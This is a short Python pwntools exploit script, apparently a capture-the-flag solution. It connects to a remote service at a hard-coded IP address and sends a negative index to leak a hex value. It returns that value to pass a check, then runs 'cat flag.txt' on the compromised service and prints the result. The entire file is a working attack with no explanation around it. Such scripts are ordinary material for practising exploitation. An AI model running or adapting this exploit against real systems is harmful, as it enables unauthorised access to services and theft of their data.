#!/usr/bin/python3
from pwn import *

def exploit(): 
  p = remote('128.61.57.148', 5000)
  p.recvuntil('check?\n')
  p.send("-22\n")
  p.recvuntil(" number is ")
  resp = p.recv(10).decode('utf-8')
  resp = int(resp,16)
  p.recvuntil('check?\n')
  p.send(str(resp) + '\n')
  p.recv()
  p.send('cat flag.txt\n')
  print(p.recv())
  p.close()  

if __name__ == "__main__":
  context.log_level="debug"
  exploit()